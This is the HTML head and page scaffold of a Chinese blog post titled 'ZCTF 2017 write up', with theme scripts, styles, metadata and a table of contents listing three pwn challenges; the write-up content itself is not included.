<!DOCTYPE html>
<html style="display: none;" lang="zh">
    <head>
    <meta charset="utf-8">
    <!--
        © Material Theme
        https://github.com/viosey/hexo-theme-material
        Version: 1.4.0 -->
    <script>window.materialVersion = "1.4.0"</script>

    <!-- Title -->
    
    <title>
        
            ZCTF 2017 write up | 
        
        DazzleP&#39;s Blog
    </title>

    <!-- dns prefetch -->
    <meta http-equiv="x-dns-prefetch-control" content="on">
    
    
    
    
    
    
    
    
    
    

    <!-- Meta & Info -->
    <meta http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="theme-color" content="#0097A7">
    <meta name="author" content="DazzleP">
    <meta name="description" itemprop="description" content="这次ZCTF做了三个pwn，第二天的三题一个都没做出来Orz，不过第一天趁着dalao们都去波士顿钥匙联欢会的时候拿了俩FB还是很开心的">
    <meta name="keywords" content="null,ctf,pwn,writeup">

    <!-- Site Verification -->
    
    

    <!-- Favicons -->
    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
    <link rel="icon" sizes="192x192" href="/img/favicon.png">
    <link rel="apple-touch-icon" href="/img/favicon.png">

    <!--iOS -->
    <meta name="apple-mobile-web-app-title" content="Title">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="480">

    <!-- Add to homescreen for Chrome on Android -->
    <meta name="mobile-web-app-capable" content="yes">

    <!-- Add to homescreen for Safari on iOS -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="DazzleP&#39;s Blog">

    <!-- The Open Graph protocol -->
    <meta property="og:url" content="http://blog.dazzlepppp.cn">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="ZCTF 2017 write up | DazzleP&#39;s Blog">
    <meta property="og:image" content="/img/favicon.png" />
    <meta property="og:description" content="这次ZCTF做了三个pwn，第二天的三题一个都没做出来Orz，不过第一天趁着dalao们都去波士顿钥匙联欢会的时候拿了俩FB还是很开心的">
    <meta property="og:article:tag" content="ctf"> <meta property="og:article:tag" content="pwn"> <meta property="og:article:tag" content="writeup"> 

    
        <meta property="article:published_time" content="Feb 27, 2017" />
        <meta property="article:modified_time" content="May 04, 2017" />
    

    <!-- The Twitter Card protocol -->
    <meta name="twitter:title" content="ZCTF 2017 write up | DazzleP&#39;s Blog">
    <meta name="twitter:description" content="这次ZCTF做了三个pwn，第二天的三题一个都没做出来Orz，不过第一天趁着dalao们都去波士顿钥匙联欢会的时候拿了俩FB还是很开心的">
    <meta name="twitter:image" content="/img/favicon.png">
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:url" content="http://blog.dazzlepppp.cn" />

    <!-- Add canonical link for SEO -->
    
        <link rel="canonical" href="http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/index.html" />
    

    <!-- Structured-data for SEO -->
    
        


<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "DazzleP&#39;s Blog",
        "logo": "/img/favicon.png"
    },
    "author": {
        "@type": "Person",
        "name": "DazzleP",
        "image": {
            "@type": "ImageObject",
            "url": "/img/favicon.png"
        },
        "description": "Hi, nice to meet you"
    },
    "headline": "ZCTF 2017 write up",
    "url": "http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/index.html",
    "datePublished": "Feb 27, 2017",
    "dateModified": "May 04, 2017",
    "description": "这次ZCTF做了三个pwn，第二天的三题一个都没做出来Orz，不过第一天趁着dalao们都去波士顿钥匙联欢会的时候拿了俩FB还是很开心的",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://blog.dazzlepppp.cn"
    }
}
</script>


    

    <!--[if lte IE 9]>
        <link rel="stylesheet" href="/css/ie-blocker.css">

        
            <script src="/js/ie-blocker.en.js"></script>
        
    <![endif]-->

    <!-- Import lsloader -->
    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+materialVersion+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(data&&data.indexOf(versionString)===-1){lsloader.removeLS(key)}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload){cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}code=code.split(versionString)[1];if(/\.js?.+$/.test(versionNumber)){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload)}};lsloader.requestResource=function(name,path,cssonload){var that=this;if(/\.js?.+$/.test(path)){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else if(/\.css?.+$/.test(path)){this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>

    <!-- Import CSS & jQuery -->
    
        <style id="css/material.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/material.min.css","/css/material.min.css?fJTiM/K1J3dWIruo3pxtAw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
        <style id="css/style.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/style.min.css","/css/style.min.css?oCSEO3ST+aEypEwttTDI9g==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
        
        
            <style>
    
    .footer-sns-facebook {
        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHptNjU3LjYgODcuOGw0LjggMy44djU1LjJjMCA1NC42IDAgNTUuMi00LjYgNTkuNi00LjQgNC40LTYgNC42LTUwLjIgNS42bC00NS42IDEtNy4yIDUuNmMtMTAuNCA4LTE2LjggMTcuMi0xOS4yIDI3LjQtMSA1LTEuOCAyNC44LTEuOCA0NCAuMiAzOCAxLjYgNDQuNiAxMC44IDQ4IDIuOCAxLjIgMjguNCAyIDU2LjggMiA0Ny44IDAgNTIgLjIgNTYuMiAzLjhsNC44IDMuOHY1NS4yYzAgNTQuNiAwIDU1LjItNC42IDU5LjYtNC40IDQuNi01LjQgNC42LTU3IDUuMi0yOC44LjItNTQuNC44LTU2LjggMS40LTIuNC42LTUuNiAzLTYuOCA1LjQtMS44IDMuMi0yLjQgNDEuNC0yLjYgMTQzLjJsLS4yIDEzOC44LTUuNiA0LjgtNS42IDQuOEg2MDljLTUyLjQgMC01Mi44IDAtNTguMi00LjZsLTUuNC00LjYtLjItMTQwLjYtLjItMTQwLjYtNC44LTMuOGMtNC4yLTMuNC04LTMuOC0zNS42LTMuOC0zMi44IDAtNDEtMS44LTQzLjYtMTAtLjYtMi4yLTEuMi0yNS40LTEuMi01MS40IDAtNjAuOC0uMi01NyAzLjQtNjEuNiAyLjgtMy42IDYtNCAzNy44LTUgMzMtMSAzNS4yLTEuMiAzOS40LTUuNiA0LjYtNC40IDQuNi01LjIgNS44LTcxIDEuMi03My40LjItNjcuMiAxNi42LTk5LjQgOC0xNS44IDEyLjgtMjIgMjgtMzcgMTUuMi0xNS4yIDIxLjQtMTkuNiAzOC4yLTI4IDExLTUuNCAyNC0xMSAyOS0xMi4yIDYuMi0xLjggMjguNi0yLjYgNzEuMi0yLjYgNTguNi0uMiA2Mi42IDAgNjcgMy42eiIvPjwvc3ZnPg==);
    }
    
    
    .footer-sns-twitter {
        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHptNTMyLjggMjA1YzEwIDQgMjMgMTAuOCAyOC44IDE1LjIgMTIuNiA5LjIgMTYuNiAxMC42IDI5LjQgOS40IDYuNi0uNiAxMy0zLjIgMjAuNC04LjIgMTEuMi03LjYgMTkuNC05LjIgMjMuNi01IDMuNiAzLjYgMi44IDktMi44IDE4LjYtNy4yIDEyLjQtNiAxOC44IDQuMiAyNC4yIDQuNCAyLjIgOC4yIDUuNiA4LjYgNy40IDEgNC44LTEyLjYgMjQuMi0yMiAzMS44LTExLjggOS4yLTE3LjIgMjIuNi0xOS42IDQ3LjgtNC44IDUwLjQtNy44IDY2LjYtMTYuNCA4NS40LTMgNy03IDE3LjgtOC44IDI0LTEuOCA2LjQtNSAxNC42LTcuNCAxOC40LTIuMiAzLjgtNy40IDEzLTExLjQgMjAuNC0xNy4yIDMwLjgtNDMuNCA2MS40LTcxLjQgODMuOC0yNS42IDIwLjQtNDYgMzMuMi02NC4yIDQwLjItOC40IDMuMi0xOCA3LjYtMjEuNCA5LjYtNy40IDQuNi0yMi40IDguNi01Ny4yIDE1LTYyLjIgMTEuNi03OS4yIDExLjQtMTM1LjYtMS0zMi40LTctMzguNi05LTUyLTE2LjgtMjEuNC0xMi42LTI0LjItMTQuOC0yNC4yLTE5LjQgMC02LjIgMTAuMi05LjIgMzUtMTAuNCAyMi40LTEgMjguNi0yLjYgNTctMTQuMiAyMy44LTkuOCAyOS40LTEyLjggMzAuNC0xNi44IDIuMi04LjItMy0xMy4yLTI2LjgtMjUuNC0yNS44LTEzLjItMzIuMi0xOC40LTQzLjgtMzUuOC05LTEzLjYtMTAtMjEuMi0zLjYtMzMuNiA1LjQtMTAuOCAzLjYtMTUtMTEuOC0yNS40LTktNi0xNC0xMS42LTIwLjgtMjIuNi0yMy40LTM3LjgtMjUtNTAuOC03LjItNTkuOCA0LjgtMi40IDkuNC01LjQgMTAuMi02LjYgMi44LTQuMi0uNC0xNS42LTguNC0yOS0xMS42LTE5LjYtMTMuMi0yNS44LTEzLjItNTUuMiAwLTI4LjggMi42LTM3LjggMTItNDAuMiA5LTIuMiAxNC44IDEgMzUuNiAyMC4yIDI0LjggMjIuOCA0My42IDM2LjYgNjIuOCA0NS44IDggMy44IDE3LjggOS4yIDIyIDEyIDQuMiAyLjggMTQuOCA3IDIzLjQgOS4yIDguNiAyLjIgMjQuMiA2LjggMzQuOCAxMC4yIDEzLjQgNC40IDIzLjYgNi40IDMzIDYuNiAxMi44LjIgMTQuMi0uMiAxOC42LTUuNCA0LTQuOCA0LjgtNy44IDQuOC0xOS4yIDAtMTQuNCA1LjYtMzkuNiAxMS4yLTUwLjYgNC4yLTguNCAyOS4yLTM0LjIgMzkuOC00MS40IDcuOC01LjQgMzUuNi0xNiA1Mi0yMCAxNC4yLTMuNiAzMi42LTEuMiA1Mi40IDYuOHoiLz48L3N2Zz4=);
    }
    
    
    .footer-sns-gplus {
        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHpNNDMwIDI5NS40YzQwLjYgMTUuNCA1Ni42IDIzLjggNzIuNiAzOC40IDYuOCA2LjIgNy4yIDE1LjIgMSAyMy40LTYuMiA4LTMzLjYgMzMuOC0zOSAzNi42LTUuNiAyLjgtMTcuNiAyLjgtMjMuMi0uMi0yLjQtMS4yLTguMi01LjItMTMtOC44LTExLjItOC42LTI0LjYtMTEuMi01NS4yLTExLjItMjcuNCAwLTQwLjYgMi42LTUyLjIgMTAuNC00LjQgMi44LTEyLjIgNy42LTE3LjIgMTAuNi0yMyAxMy4yLTUxLjQgNTUtNTUuOCA4Mi40LTIuNiAxNS42LTIuNCAzNC44LjIgNTEgMi44IDE3LjQgMTkuOCA0OC44IDM1LjIgNjUuMiAxNiAxNi42IDQ1IDMzLjYgNjIuOCAzNi42IDI2LjggNC40IDY1LjggMS42IDc5LjQtNS44IDIwLjYtMTEuNCAzMS0xOSA0MS0zMC40IDE4LjgtMjEuNiAyMy40LTM0LjIgMTUuNi00My44LTMuOC00LjgtNC40LTQuOC01MS01LjgtNjAuOC0xLjItNTYuMiAyLjItNTYuMi00My4yIDAtMzIuNC4yLTMzLjIgNC44LTM3IDQuNC0zLjYgOS0zLjggOTItMy44IDc5IDAgODcuOC40IDk0LjIgMy42IDExLjIgNS42IDEzIDExLjQgMTIuOCA0My40IDAgMjUuNC0uOCAzMC44LTcuNiA1OC00IDE2LjYtOS44IDM0LTEyLjYgMzktMi44IDUtOC4yIDE0LjItMTEuNiAyMC42LTguNCAxNS40LTI3LjIgMzYuOC00MC44IDQ2LjYtNS44IDQuNC0xMy44IDEwLjItMTcuNiAxMy4yLTMuOCAzLTExIDctMTYuMiA4LjgtNS4yIDEuOC0xNi4yIDYuNC0yNC40IDEwLTIyLjQgOS42LTM0LjggMTEuNi03MyAxMS42LTM3LjYuMi00Ny0xLjQtNzEtMTItOC4yLTMuNi0xNy42LTcuMi0yMC44LTgtMTUuOC0zLjgtNjctNDUuMi03Ny44LTYyLjgtMi4yLTMuOC03LjYtMTEuNi0xMS44LTE3LjItNC4yLTUuNC05LTE0LTEwLjYtMTktMS44LTQuOC02LjItMTYtMTAtMjQuOC0zLjYtOC44LTcuOC0yMi4yLTkuMi0yOS42LTMuMi0xOC44LTEuNC03OS40IDIuOC05MS40IDEzLjgtNDAuNiAzNS42LTc4IDU4LjgtMTAwLjIgMTQtMTMuNiA0Ny4yLTM2LjQgNTgtMzkuOCA0LjItMS40IDEzLjQtNS4yIDIwLjYtOC40IDIyLTEwIDMyLjgtMTEuNiA3Ni0xMSAzMy44LjYgNDAuNCAxLjIgNTAgNC44em0zNDAuOCA4MC44YzggMy42IDkuNiAxMS4yIDkuMiAzOS4yLS42IDM0LjQtLjYgMzQgNSAzOS42IDQuOCA1IDUuNCA1IDM3LjYgNSA0My40IDAgNDQuNC44IDQzLjIgMzYuMi0uOCAxNy0xLjIgMTguNC02LjQgMjMtNS40IDQuNi02LjYgNC44LTM3LjYgNC44LTMxLjIgMC0zMiAuMi0zNi44IDUtNS42IDUuNC01LjYgNC40LTUgNDEuMi40IDI2LjQuMiAyNy40LTQuNiAzMy00LjggNS42LTYgNS44LTI0LjQgNi40LTIwLjguOC0yOS42LTEuNC0zMy40LTguNC0xLjQtMi42LTItMTUuNi0xLjgtMzUuNi40LTMxLjIuNC0zMS42LTQuNi0zNi42cy01LjYtNS0zNi01Yy0xOC44IDAtMzMtLjgtMzYtMi4yLTcuNi0zLjYtOS42LTExLjItOC44LTMzLjguOC0yOC4yLjQtMjggNDEtMjggNDUuNCAwIDQ1LjQgMCA0NC42LTQyLjYtLjYtMzMtLjYtMzMgNS0zOC40IDQuNC00LjYgNi4yLTUgMjQuOC01IDExIDAgMjIuMiAxIDI1IDIuMnoiLz48L3N2Zz4=);
    }
    
    
    
    
    
    
    
    
    
</style>

        
        <!-- Config CSS -->

<!-- Other Styles -->
<style>
  body, html {
    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
  }

  a {
    color: #00838F;
  }

  .mdl-card__media,
  #search-label,
  #search-form-label:after,
  #scheme-Paradox .hot_tags-count,
  #scheme-Paradox .sidebar_archives-count,
  #scheme-Paradox .sidebar-colored .sidebar-header,
  #scheme-Paradox .sidebar-colored .sidebar-badge{
    background-color: #0097A7 !important;
  }

  /* Sidebar User Drop Down Menu Text Color */
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
    color: #0097A7 !important;
  }

  #post_entry-right-info,
  .sidebar-colored .sidebar-nav li:hover > a,
  .sidebar-colored .sidebar-nav li:hover > a i,
  .sidebar-colored .sidebar-nav li > a:hover,
  .sidebar-colored .sidebar-nav li > a:hover i,
  .sidebar-colored .sidebar-nav li > a:focus i,
  .sidebar-colored .sidebar-nav > .open > a,
  .sidebar-colored .sidebar-nav > .open > a:hover,
  .sidebar-colored .sidebar-nav > .open > a:focus,
  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
    color: #0097A7 !important;
  }

  .toTop {
    background: #757575 !important;
  }

  .material-layout .material-post>.material-nav,
  .material-layout .material-index>.material-nav,
  .material-nav a {
    color: #757575;
  }

  #scheme-Paradox .MD-burger-layer {
    background-color: #757575;
  }

  #scheme-Paradox #post-toc-trigger-btn {
    color: #757575;
  }

  .post-toc a:hover {
    color: #00838F;
    text-decoration: underline;
  }

</style>


<!-- Theme Background Related-->

    <style>
      body{
        background-color: #F5F5F5;
      }

      /* blog_info bottom background */
      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
        background-color: #fff;
      }
    </style>




<!-- Fade Effect -->

    <style>
      .fade {
        transition: all 800ms linear;
        -webkit-transform: translate3d(0,0,0);
        -moz-transform: translate3d(0,0,0);
        -ms-transform: translate3d(0,0,0);
        -o-transform: translate3d(0,0,0);
        transform: translate3d(0,0,0);
        opacity: 1;
      }

      .fade.out{
        opacity: 0;
      }
    </style>


<!-- Import Font -->

    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"rel="stylesheet">


        <script>lsloader.load("js/jquery.min.js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==")</script>
    
    
    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>

    <!-- Analytics -->
    

    <!-- Custom Head -->
    
</head>


    
        <body id="scheme-Paradox" class="lazy">
            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
                

                <!-- Main Container -->
                <main class="material-layout__content" id="main">

                    <!-- Top Anchor -->
                    <div id="top"></div>

                    
                        <!-- Hamburger Button -->
                        <button class="MD-burger-icon sidebar-toggle">
                            <span class="MD-burger-layer"></span>
                        </button>
                    

                    <!-- Post TOC -->

    
    <!-- Back Button -->
    <!--
    <div class="material-back" id="backhome-div" tabindex="0">
        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
           href="#" onclick="window.history.back();return false;"
           target="_self"
           role="button"
           data-upgraded=",MaterialButton,MaterialRipple">
            <i class="material-icons" role="presentation">arrow_back</i>
            <span class="mdl-button__ripple-container">
                <span class="mdl-ripple"></span>
            </span>
        </a>
    </div>
    -->

    <!-- Left aligned menu below button -->
    <button id="post-toc-trigger-btn"
        class="mdl-button mdl-js-button mdl-button--icon">
        <i class="material-icons">format_list_numbered</i>
    </button>

    
    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#login"><span class="post-toc-number">1.</span> <span class="post-toc-text">login</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dragon"><span class="post-toc-number">2.</span> <span class="post-toc-text">dragon</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#note"><span class="post-toc-number">3.</span> <span class="post-toc-text">note</span></a></li></ol>
        <!--
        <li class="mdl-menu__item">
            Some Action
        </li>
        -->
    </ul>
    





<!-- Layouts -->

    <!-- Post Module -->
    <div class="material-post_container">

        <div class="material-post mdl-grid">
            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">

                <!-- Post Header(Thumbnail & Title) -->
                
    <!-- Paradox Post Header -->
    
        
            <!-- Random Thumbnail -->
            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
            <script type="text/ls-javascript" id="post-thumbnail-script">
    var randomNum = Math.floor(Math.random() * 19 + 1);

    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
    $('.post_thumbnail-random').addClass('lazy');
</script>

        
    
            <p class="article-headline-p">
                ZCTF 2017 write up
            </p>
        </div>





                
                    <!-- Paradox Post Info -->
                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">

    <!-- Author Avatar -->
    <div id="author-avatar">
        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
    </div>
    <!-- Author Name & Date -->
    <div>
        <strong>DazzleP</strong>
        <span>Feb 27, 2017</span>
    </div>

    <div class="section-spacer"></div>

    <!-- Favorite -->
    <!--
        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
            <i class="material-icons" role="presentation">favorite</i>
            <span class="visuallyhidden">favorites</span>
        </button>
    -->

    <!-- Qrcode -->
    

    <!-- Tags (bookmark) -->
    
